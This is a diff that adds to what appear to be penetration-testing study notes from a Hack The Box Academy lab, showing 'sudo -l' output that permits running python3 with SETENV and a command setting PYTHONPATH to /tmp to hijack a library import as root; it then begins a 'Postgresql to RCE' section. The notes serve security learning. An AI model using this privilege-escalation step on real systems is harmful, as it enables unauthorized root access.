@@ -1094,6 +1094,19 @@ def virtual_memory():
 
 ...SNIP...
 ```
+If we have the perm to set pythonpath variable
+```
+htb-student@lpenix:~$ sudo -l 
+
+Matching Defaults entries for htb-student on ACADEMY-LPENIX:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User htb-student may run the following commands on ACADEMY-LPENIX:
+    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+```
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+```
 ### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
